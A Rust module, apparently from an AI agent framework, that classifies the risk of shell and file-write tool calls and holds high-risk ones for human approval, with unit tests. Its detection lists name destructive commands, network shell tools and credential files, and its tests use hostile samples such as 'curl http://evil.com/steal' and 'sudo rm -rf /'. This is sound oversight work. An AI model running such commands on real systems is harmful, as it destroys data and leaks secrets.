//! # Tool Approval Gate — Human-in-the-Loop Checkpoint
//!
//! Adds risk-based approval requirements before high-risk tool executions.
//! Integrates with the existing AutonomyGate in the controller chain.
//!
//! ## Risk Classification
//!
//! | Risk Level  | Example Tools           | Approval Required |
//! |-------------|-------------------------|-------------------|
//! | Critical    | rm -rf, DROP TABLE      | Always            |
//! | High        | write to /etc, chmod 777| Always            |
//! | Medium      | curl external, pip install| Configurable     |
//! | Low         | cat, ls, grep           | Never             |
//!
//! ## Flow
//!
//! ```text
//! Tool Request → Risk Assessment → Low? → Auto-approve
//!                                → Medium? → Check threshold → Auto or Queue
//!                                → High/Critical? → Always queue → Wait for human
//! ```

use chrono::{DateTime, Utc};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::{Mutex, Notify};
use tracing::{debug, info, warn};

// ===========================================================================
// Risk Classification
// ===========================================================================

/// Risk level for a tool execution
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
pub enum RiskLevel {
    /// Read-only, no side effects (cat, ls, grep)
    Low,
    /// Moderate side effects (curl external, pip install)
    Medium,
    /// Significant side effects (write system files, chmod)
    High,
    /// Destructive / irreversible (rm -rf, DROP TABLE, format disk)
    Critical,
}

impl RiskLevel {
    /// Numeric weight for threshold comparison
    pub fn weight(self) -> u32 {
        match self {
            Self::Low => 0,
            Self::Medium => 1,
            Self::High => 2,
            Self::Critical => 3,
        }
    }
}

/// Risk assessment result for a specific tool invocation
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RiskAssessment {
    /// Tool name
    pub tool: String,
    /// Assessed risk level
    pub risk_level: RiskLevel,
    /// Human-readable reason for the risk classification
    pub reason: String,
    /// Specific risk factors detected
    pub factors: Vec<RiskFactor>,
    /// Overall risk score (0.0 - 1.0)
    pub score: f64,
}

/// Individual risk factor contributing to the assessment
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RiskFactor {
    pub name: String,
    pub description: String,
    pub weight: f64,
}

// ===========================================================================
// Approval Decision
// ===========================================================================

/// Outcome of an approval check
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ApprovalDecision {
    /// Auto-approved (risk below threshold)
    AutoApproved,
    /// Queued for human approval
    PendingApproval { request_id: String },
    /// Rejected (risk exceeds maximum allowed)
    Rejected { reason: String },
    /// Timed out waiting for human approval
    TimedOut { request_id: String },
}

/// Human approval response
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ApprovalResponse {
    /// Approved by human
    Approved { approver: String, comment: Option<String> },
    /// Rejected by human
    Rejected { approver: String, reason: String },
}

// ===========================================================================
// Approval Request
// ===========================================================================

/// A pending approval request
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalRequest {
    /// Unique request ID
    pub id: String,
    /// Tool being executed
    pub tool: String,
    /// Tool arguments (for human review)
    pub args: String,
    /// Risk assessment
    pub risk: RiskAssessment,
    /// When the request was created
    pub created_at: DateTime<Utc>,
    /// Approval timeout (seconds)
    pub timeout_secs: u64,
    /// Current status
    pub status: ApprovalRequestStatus,
    /// Resolution (if completed)
    pub resolution: Option<ApprovalResponse>,
    /// When resolved
    pub resolved_at: Option<DateTime<Utc>>,
}

/// Status of an approval request
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum ApprovalRequestStatus {
    /// Waiting for human response
    Pending,
    /// Approved
    Approved,
    /// Rejected
    Rejected,
    /// Timed out
    TimedOut,
}

// ===========================================================================
// Risk Rules
// ===========================================================================

/// Configurable risk rule for a tool
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RiskRule {
    /// Tool name pattern (supports * wildcard)
    pub tool_pattern: String,
    /// Override risk level
    pub risk_level: Option<RiskLevel>,
    /// Risk factors to check
    pub factors: Vec<String>,
    /// Auto-approve below this threshold (0.0 = never auto-approve)
    pub auto_approve_threshold: f64,
    /// Approval timeout (seconds)
    pub timeout_secs: u64,
}

// ===========================================================================
// Approval Gate Configuration
// ===========================================================================

/// Configuration for the tool approval gate
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalGateConfig {
    /// Global risk threshold: auto-approve if risk score < this
    pub global_auto_approve_threshold: f64,
    /// Global maximum risk: reject if risk score > this (bypass human)
    pub global_max_risk_threshold: f64,
    /// Default approval timeout (seconds)
    pub default_timeout_secs: u64,
    /// Per-tool risk rules (override global defaults)
    pub tool_rules: HashMap<String, RiskRule>,
    /// Enable/disable the gate entirely
    pub enabled: bool,
}

impl Default for ApprovalGateConfig {
    fn default() -> Self {
        let mut tool_rules = HashMap::new();

        // Critical tools: always require approval
        tool_rules.insert(
            "shell".to_string(),
            RiskRule {
                tool_pattern: "shell".to_string(),
                risk_level: Some(RiskLevel::High),
                factors: vec!["destructive_command".to_string(), "network_access".to_string()],
                auto_approve_threshold: 0.0, // never auto-approve
                timeout_secs: 300,
            },
        );

        tool_rules.insert(
            "file_write".to_string(),
            RiskRule {
                tool_pattern: "file_write".to_string(),
                risk_level: Some(RiskLevel::Medium),
                factors: vec!["system_path".to_string(), "sensitive_file".to_string()],
                auto_approve_threshold: 0.3,
                timeout_secs: 120,
            },
        );

        Self {
            global_auto_approve_threshold: 0.2,
            global_max_risk_threshold: 0.9,
            default_timeout_secs: 120,
            tool_rules,
            enabled: true,
        }
    }
}

// ===========================================================================
// Approval Gate
// ===========================================================================

/// Human-in-the-loop approval gate for high-risk tool executions
pub struct ApprovalGate {
    config: ApprovalGateConfig,
    /// Pending approval requests
    pending: Arc<Mutex<HashMap<String, ApprovalRequest>>>,
    /// Completed requests (audit trail)
    completed: Arc<Mutex<Vec<ApprovalRequest>>>,
    /// Notification when a request is resolved
    notify: Arc<Notify>,
    /// Built-in risk assessors
    assessors: Vec<Box<dyn RiskAssessor + Send + Sync>>,
}

/// Trait for pluggable risk assessment strategies
pub trait RiskAssessor: Send + Sync {
    /// Assess the risk of a tool invocation
    fn assess(&self, tool: &str, args: &str) -> Option<RiskAssessment>;
}

impl ApprovalGate {
    /// Create a new approval gate
    pub fn new(config: ApprovalGateConfig) -> Self {
        let mut gate = Self {
            config,
            pending: Arc::new(Mutex::new(HashMap::new())),
            completed: Arc::new(Mutex::new(Vec::new())),
            notify: Arc::new(Notify::new()),
            assessors: Vec::new(),
        };

        // Register built-in assessors
        gate.assessors.push(Box::new(ShellRiskAssessor));
        gate.assessors.push(Box::new(FileWriteRiskAssessor));
        gate.assessors.push(Box::new(DefaultRiskAssessor));
        gate
    }

    /// Check if a tool execution is allowed
    ///
    /// Returns the approval decision. If `PendingApproval`, the caller should
    /// wait for `wait_for_approval()` or proceed based on timeout policy.
    pub async fn check_approval(
        &self,
        tool: &str,
        args: &str,
    ) -> ApprovalDecision {
        if !self.config.enabled {
            return ApprovalDecision::AutoApproved;
        }

        // Step 1: Assess risk
        let risk = self.assess_risk(tool, args);

        // Step 2: Check global max threshold (reject without human)
        if risk.score > self.config.global_max_risk_threshold {
            warn!(
                tool = tool,
                risk_score = risk.score,
                "Tool execution rejected: risk exceeds maximum threshold"
            );
            return ApprovalDecision::Rejected {
                reason: format!(
                    "Risk score {:.2} exceeds maximum threshold {:.2}",
                    risk.score, self.config.global_max_risk_threshold
                ),
            };
        }

        // Step 3: Check auto-approve threshold
        let threshold = self
            .config
            .tool_rules
            .get(tool)
            .map(|r| r.auto_approve_threshold)
            .unwrap_or(self.config.global_auto_approve_threshold);

        if risk.score < threshold {
            debug!(
                tool = tool,
                risk_score = risk.score,
                threshold = threshold,
                "Tool execution auto-approved"
            );
            return ApprovalDecision::AutoApproved;
        }

        // Step 4: Queue for human approval
        let request_id = uuid::Uuid::new_v4().to_string();
        let timeout = self
            .config
            .tool_rules
            .get(tool)
            .map(|r| r.timeout_secs)
            .unwrap_or(self.config.default_timeout_secs);

        let request = ApprovalRequest {
            id: request_id.clone(),
            tool: tool.to_string(),
            args: args.to_string(),
            risk,
            created_at: Utc::now(),
            timeout_secs: timeout,
            status: ApprovalRequestStatus::Pending,
            resolution: None,
            resolved_at: None,
        };

        info!(
            request_id = %request_id,
            tool = tool,
            risk_score = request.risk.score,
            timeout = timeout,
            "Tool execution queued for human approval"
        );

        let mut pending = self.pending.lock().await;
        pending.insert(request_id.clone(), request);

        ApprovalDecision::PendingApproval { request_id }
    }

    /// Submit a human approval response
    pub async fn respond(
        &self,
        request_id: &str,
        response: ApprovalResponse,
    ) -> bool {
        let mut pending = self.pending.lock().await;
        if let Some(mut request) = pending.remove(request_id) {
            let now = Utc::now();
            request.status = match &response {
                ApprovalResponse::Approved { .. } => ApprovalRequestStatus::Approved,
                ApprovalResponse::Rejected { .. } => ApprovalRequestStatus::Rejected,
            };
            request.resolution = Some(response);
            request.resolved_at = Some(now);

            info!(
                request_id = %request_id,
                tool = %request.tool,
                status = ?request.status,
                "Approval request resolved"
            );

            let mut completed = self.completed.lock().await;
            completed.push(request);

            self.notify.notify_waiters();
            true
        } else {
            warn!(request_id = request_id, "Approval request not found");
            false
        }
    }

    /// Wait for an approval request to be resolved (with timeout)
    pub async fn wait_for_approval(
        &self,
        request_id: &str,
    ) -> ApprovalDecision {
        let timeout = {
            let pending = self.pending.lock().await;
            pending
                .get(request_id)
                .map(|r| r.timeout_secs)
                .unwrap_or(self.config.default_timeout_secs)
        };

        let deadline = tokio::time::Instant::now()
            + tokio::time::Duration::from_secs(timeout);

        loop {
            // Check if resolved
            {
                let completed = self.completed.lock().await;
                if let Some(req) = completed.iter().find(|r| r.id == request_id) {
                    return match &req.resolution {
                        Some(ApprovalResponse::Approved { .. }) => {
                            ApprovalDecision::AutoApproved // re-use as "approved"
                        }
                        Some(ApprovalResponse::Rejected { reason, .. }) => {
                            ApprovalDecision::Rejected { reason: reason.clone() }
                        }
                        None => ApprovalDecision::TimedOut {
                            request_id: request_id.to_string(),
                        },
                    };
                }
            }

            // Check timeout
            if tokio::time::Instant::now() >= deadline {
                // Mark as timed out
                let mut pending = self.pending.lock().await;
                if let Some(mut req) = pending.remove(request_id) {
                    req.status = ApprovalRequestStatus::TimedOut;
                    req.resolved_at = Some(Utc::now());
                    let mut completed = self.completed.lock().await;
                    completed.push(req);
                }
                return ApprovalDecision::TimedOut {
                    request_id: request_id.to_string(),
                };
            }

            // Wait for notification or timeout
            tokio::select! {
                _ = self.notify.notified() => {}
                _ = tokio::time::sleep_until(deadline) => {}
            }
        }
    }

    /// Get all pending approval requests
    pub async fn pending_requests(&self) -> Vec<ApprovalRequest> {
        let pending = self.pending.lock().await;
        pending.values().cloned().collect()
    }

    /// Get completed requests (audit trail)
    pub async fn audit_trail(&self) -> Vec<ApprovalRequest> {
        let completed = self.completed.lock().await;
        completed.clone()
    }

    /// Get approval statistics
    pub async fn stats(&self) -> ApprovalStats {
        let pending = self.pending.lock().await;
        let completed = self.completed.lock().await;

        let approved = completed
            .iter()
            .filter(|r| r.status == ApprovalRequestStatus::Approved)
            .count();
        let rejected = completed
            .iter()
            .filter(|r| r.status == ApprovalRequestStatus::Rejected)
            .count();
        let timed_out = completed
            .iter()
            .filter(|r| r.status == ApprovalRequestStatus::TimedOut)
            .count();

        ApprovalStats {
            pending_count: pending.len(),
            approved_count: approved,
            rejected_count: rejected,
            timed_out_count: timed_out,
            total_completed: completed.len(),
        }
    }

    // -- internal -----------------------------------------------------------

    fn assess_risk(&self, tool: &str, args: &str) -> RiskAssessment {
        // Check tool-specific rule first
        if let Some(rule) = self.config.tool_rules.get(tool) {
            if let Some(level) = rule.risk_level {
                return RiskAssessment {
                    tool: tool.to_string(),
                    risk_level: level,
                    reason: format!("Tool-specific rule: {tool}"),
                    factors: vec![],
                    score: level.weight() as f64 / 3.0,
                };
            }
        }

        // Use registered assessors
        for assessor in &self.assessors {
            if let Some(assessment) = assessor.assess(tool, args) {
                return assessment;
            }
        }

        // Default: low risk
        RiskAssessment {
            tool: tool.to_string(),
            risk_level: RiskLevel::Low,
            reason: "Default: no risk factors detected".to_string(),
            factors: vec![],
            score: 0.0,
        }
    }
}

/// Approval statistics
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApprovalStats {
    pub pending_count: usize,
    pub approved_count: usize,
    pub rejected_count: usize,
    pub timed_out_count: usize,
    pub total_completed: usize,
}

// ===========================================================================
// Built-in Risk Assessors
// ===========================================================================

/// Shell command risk assessor
struct ShellRiskAssessor;

impl RiskAssessor for ShellRiskAssessor {
    fn assess(&self, tool: &str, args: &str) -> Option<RiskAssessment> {
        if tool != "shell" {
            return None;
        }

        let mut factors = Vec::new();
        let mut score: f64 = 0.3; // base risk for any shell command

        // Check for destructive commands
        let destructive_patterns = [
            "rm -rf", "rm -r /", "mkfs", "dd if=", "format ",
            "DROP TABLE", "DROP DATABASE", "TRUNCATE", "DELETE FROM",
            "> /dev/sd", "chmod 777", "chown root",
        ];
        for pattern in &destructive_patterns {
            if args.to_lowercase().contains(&pattern.to_lowercase()) {
                factors.push(RiskFactor {
                    name: "destructive_command".to_string(),
                    description: format!("Contains destructive pattern: {pattern}"),
                    weight: 0.5,
                });
                score += 0.5;
            }
        }

        // Check for network access
        let network_patterns = ["curl ", "wget ", "nc ", "ncat ", "ssh ", "scp "];
        for pattern in &network_patterns {
            if args.contains(pattern) {
                factors.push(RiskFactor {
                    name: "network_access".to_string(),
                    description: format!("Contains network command: {pattern}"),
                    weight: 0.2,
                });
                score += 0.2;
            }
        }

        // Check for privilege escalation
        let priv_patterns = ["sudo ", "su -", "pkexec"];
        for pattern in &priv_patterns {
            if args.contains(pattern) {
                factors.push(RiskFactor {
                    name: "privilege_escalation".to_string(),
                    description: format!("Contains privilege escalation: {pattern}"),
                    weight: 0.3,
                });
                score += 0.3;
            }
        }

        let risk_level = if score >= 0.8 {
            RiskLevel::Critical
        } else if score >= 0.5 {
            RiskLevel::High
        } else if score >= 0.3 {
            RiskLevel::Medium
        } else {
            RiskLevel::Low
        };

        Some(RiskAssessment {
            tool: tool.to_string(),
            risk_level,
            reason: format!("Shell command analysis: {} risk factors", factors.len()),
            factors,
            score: score.min(1.0),
        })
    }
}

/// File write risk assessor
struct FileWriteRiskAssessor;

impl RiskAssessor for FileWriteRiskAssessor {
    fn assess(&self, tool: &str, args: &str) -> Option<RiskAssessment> {
        if tool != "file_write" {
            return None;
        }

        let mut factors = Vec::new();
        let mut score: f64 = 0.2; // base risk for file writes

        // System paths
        let system_paths = ["/etc/", "/usr/", "/var/", "/boot/", "/proc/", "/sys/"];
        for path in &system_paths {
            if args.contains(path) {
                factors.push(RiskFactor {
                    name: "system_path".to_string(),
                    description: format!("Writing to system path: {path}"),
                    weight: 0.4,
                });
                score += 0.4;
            }
        }

        // Sensitive files
        let sensitive_files = [
            "/etc/passwd", "/etc/shadow", "/etc/sudoers",
            ".ssh/id_", ".env", "credentials", "secret",
        ];
        for file in &sensitive_files {
            if args.to_lowercase().contains(&file.to_lowercase()) {
                factors.push(RiskFactor {
                    name: "sensitive_file".to_string(),
                    description: format!("Writing to sensitive file: {file}"),
                    weight: 0.3,
                });
                score += 0.3;
            }
        }

        let risk_level = if score >= 0.7 {
            RiskLevel::Critical
        } else if score >= 0.5 {
            RiskLevel::High
        } else if score >= 0.3 {
            RiskLevel::Medium
        } else {
            RiskLevel::Low
        };

        Some(RiskAssessment {
            tool: tool.to_string(),
            risk_level,
            reason: format!("File write analysis: {} risk factors", factors.len()),
            factors,
            score: score.min(1.0),
        })
    }
}

/// Default risk assessor (catches all tools)
struct DefaultRiskAssessor;

impl RiskAssessor for DefaultRiskAssessor {
    fn assess(&self, tool: &str, _args: &str) -> Option<RiskAssessment> {
        // Known low-risk tools
        let low_risk = ["file_read", "search", "get", "list", "status", "health"];
        if low_risk.iter().any(|t| tool.contains(t)) {
            return Some(RiskAssessment {
                tool: tool.to_string(),
                risk_level: RiskLevel::Low,
                reason: "Known low-risk tool".to_string(),
                factors: vec![],
                score: 0.0,
            });
        }

        // Unknown tools get medium risk
        Some(RiskAssessment {
            tool: tool.to_string(),
            risk_level: RiskLevel::Medium,
            reason: "Unknown tool: defaulting to medium risk".to_string(),
            factors: vec![RiskFactor {
                name: "unknown_tool".to_string(),
                description: format!("Tool '{tool}' has no specific risk rule"),
                weight: 0.3,
            }],
            score: 0.3,
        })
    }
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn test_config() -> ApprovalGateConfig {
        ApprovalGateConfig {
            global_auto_approve_threshold: 0.2,
            global_max_risk_threshold: 0.9,
            default_timeout_secs: 5,
            tool_rules: HashMap::new(),
            enabled: true,
        }
    }

    fn default_config() -> ApprovalGateConfig {
        ApprovalGateConfig::default()
    }

    // --- Risk Assessment Tests ---

    #[test]
    fn test_shell_risk_low() {
        let gate = ApprovalGate::new(test_config());
        let risk = gate.assess_risk("shell", "cat /etc/hostname");
        assert_eq!(risk.risk_level, RiskLevel::Low);
    }

    #[test]
    fn test_shell_risk_high_destructive() {
        let gate = ApprovalGate::new(test_config());
        let risk = gate.assess_risk("shell", "rm -rf /important/data");
        assert!(risk.risk_level >= RiskLevel::High);
        assert!(risk.factors.iter().any(|f| f.name == "destructive_command"));
    }

    #[test]
    fn test_shell_risk_network() {
        let gate = ApprovalGate::new(test_config());
        let risk = gate.assess_risk("shell", "curl http://evil.com/steal");
        assert!(risk.factors.iter().any(|f| f.name == "network_access"));
    }

    #[test]
    fn test_shell_risk_privilege_escalation() {
        let gate = ApprovalGate::new(test_config());
        let risk = gate.assess_risk("shell", "sudo rm -rf /");
        assert!(risk.factors.iter().any(|f| f.name == "privilege_escalation"));
        assert!(risk.factors.iter().any(|f| f.name == "destructive_command"));
    }

    #[test]
    fn test_file_write_risk_system_path() {
        let gate = ApprovalGate::new(test_config());
        let risk = gate.assess_risk("file_write", "/etc/passwd:root:x:0:0");
        assert!(risk.risk_level >= RiskLevel::High);
        assert!(risk.factors.iter().any(|f| f.name == "system_path"));
        assert!(risk.factors.iter().any(|f| f.name == "sensitive_file"));
    }

    #[test]
    fn test_file_write_risk_normal() {
        let gate = ApprovalGate::new(test_config());
        let risk = gate.assess_risk("file_write", "/tmp/test.txt:hello");
        assert_eq!(risk.risk_level, RiskLevel::Low);
    }

    #[test]
    fn test_file_read_always_low() {
        let gate = ApprovalGate::new(test_config());
        let risk = gate.assess_risk("file_read", "/etc/shadow");
        assert_eq!(risk.risk_level, RiskLevel::Low);
    }

    #[test]
    fn test_unknown_tool_medium_risk() {
        let gate = ApprovalGate::new(test_config());
        let risk = gate.assess_risk("custom_tool", "some args");
        assert_eq!(risk.risk_level, RiskLevel::Medium);
    }

    // --- Approval Gate Tests ---

    #[tokio::test]
    async fn test_auto_approve_low_risk() {
        let gate = ApprovalGate::new(test_config());
        let decision = gate.check_approval("file_read", "/tmp/test.txt").await;
        assert_eq!(decision, ApprovalDecision::AutoApproved);
    }

    #[tokio::test]
    async fn test_disabled_gate_auto_approves() {
        let config = ApprovalGateConfig {
            enabled: false,
            ..test_config()
        };
        let gate = ApprovalGate::new(config);
        let decision = gate.check_approval("shell", "rm -rf /").await;
        assert_eq!(decision, ApprovalDecision::AutoApproved);
    }

    #[tokio::test]
    async fn test_high_risk_queued() {
        let gate = ApprovalGate::new(default_config());
        let decision = gate.check_approval("shell", "rm -rf /data").await;
        match decision {
            ApprovalDecision::PendingApproval { request_id } => {
                assert!(!request_id.is_empty());
            }
            _ => panic!("Expected PendingApproval, got {:?}", decision),
        }
    }

    #[tokio::test]
    async fn test_critical_risk_rejected() {
        let config = ApprovalGateConfig {
            global_max_risk_threshold: 0.5,
            ..test_config()
        };
        let gate = ApprovalGate::new(config);
        let decision = gate.check_approval("shell", "rm -rf /").await;
        assert!(matches!(decision, ApprovalDecision::Rejected { .. }));
    }

    #[tokio::test]
    async fn test_pending_requests() {
        let gate = ApprovalGate::new(default_config());
        gate.check_approval("shell", "sudo apt install").await;

        let pending = gate.pending_requests().await;
        assert_eq!(pending.len(), 1);
        assert_eq!(pending[0].tool, "shell");
    }

    #[tokio::test]
    async fn test_approve_and_audit() {
        let gate = ApprovalGate::new(default_config());

        let decision = gate.check_approval("shell", "sudo apt install").await;
        let request_id = match &decision {
            ApprovalDecision::PendingApproval { request_id } => request_id.clone(),
            _ => return, // auto-approved by threshold
        };

        let approved = gate
            .respond(
                &request_id,
                ApprovalResponse::Approved {
                    approver: "admin".to_string(),
                    comment: Some("OK for dev env".to_string()),
                },
            )
            .await;
        assert!(approved);

        let trail = gate.audit_trail().await;
        assert_eq!(trail.len(), 1);
        assert_eq!(trail[0].status, ApprovalRequestStatus::Approved);
    }

    #[tokio::test]
    async fn test_reject_and_audit() {
        let gate = ApprovalGate::new(default_config());

        let decision = gate.check_approval("shell", "curl http://evil.com").await;
        let request_id = match &decision {
            ApprovalDecision::PendingApproval { request_id } => request_id.clone(),
            _ => return,
        };

        let rejected = gate
            .respond(
                &request_id,
                ApprovalResponse::Rejected {
                    approver: "security".to_string(),
                    reason: "Blocked external endpoint".to_string(),
                },
            )
            .await;
        assert!(rejected);

        let trail = gate.audit_trail().await;
        assert_eq!(trail[0].status, ApprovalRequestStatus::Rejected);
    }

    #[tokio::test]
    async fn test_respond_to_nonexistent() {
        let gate = ApprovalGate::new(test_config());
        let result = gate
            .respond(
                "nonexistent-id",
                ApprovalResponse::Approved {
                    approver: "admin".to_string(),
                    comment: None,
                },
            )
            .await;
        assert!(!result);
    }

    #[tokio::test]
    async fn test_stats() {
        let gate = ApprovalGate::new(default_config());

        // Auto-approve a low-risk
        gate.check_approval("file_read", "/tmp/x").await;

        let stats = gate.stats().await;
        assert_eq!(stats.approved_count, 0); // auto-approved doesn't go to completed
        assert_eq!(stats.total_completed, 0);
    }

    #[tokio::test]
    async fn test_wait_for_approval_timeout() {
        let config = ApprovalGateConfig {
            default_timeout_secs: 1,
            ..default_config()
        };
        let gate = ApprovalGate::new(config);

        let decision = gate.check_approval("shell", "sudo reboot").await;
        let request_id = match &decision {
            ApprovalDecision::PendingApproval { request_id } => request_id.clone(),
            _ => return,
        };

        let result = gate.wait_for_approval(&request_id).await;
        assert!(matches!(result, ApprovalDecision::TimedOut { .. }));
    }

    // --- Serialization Tests ---

    #[test]
    fn test_risk_level_ordering() {
        assert!(RiskLevel::Low < RiskLevel::Medium);
        assert!(RiskLevel::Medium < RiskLevel::High);
        assert!(RiskLevel::High < RiskLevel::Critical);
    }

    #[test]
    fn test_risk_level_serialization() {
        let levels = [
            RiskLevel::Low,
            RiskLevel::Medium,
            RiskLevel::High,
            RiskLevel::Critical,
        ];
        for level in &levels {
            let json = serde_json::to_string(level).unwrap();
            let deserialized: RiskLevel = serde_json::from_str(&json).unwrap();
            assert_eq!(*level, deserialized);
        }
    }

    #[test]
    fn test_approval_decision_serialization() {
        let decisions = [
            ApprovalDecision::AutoApproved,
            ApprovalDecision::PendingApproval { request_id: "test-123".into() },
            ApprovalDecision::Rejected { reason: "too risky".into() },
            ApprovalDecision::TimedOut { request_id: "test-456".into() },
        ];
        for decision in &decisions {
            let json = serde_json::to_string(decision).unwrap();
            let deserialized: ApprovalDecision = serde_json::from_str(&json).unwrap();
            assert_eq!(*decision, deserialized);
        }
    }

    #[test]
    fn test_approval_response_serialization() {
        let responses = [
            ApprovalResponse::Approved { approver: "admin".into(), comment: None },
            ApprovalResponse::Rejected { approver: "sec".into(), reason: "blocked".into() },
        ];
        for resp in &responses {
            let json = serde_json::to_string(resp).unwrap();
            let deserialized: ApprovalResponse = serde_json::from_str(&json).unwrap();
            assert_eq!(*resp, deserialized);
        }
    }
}
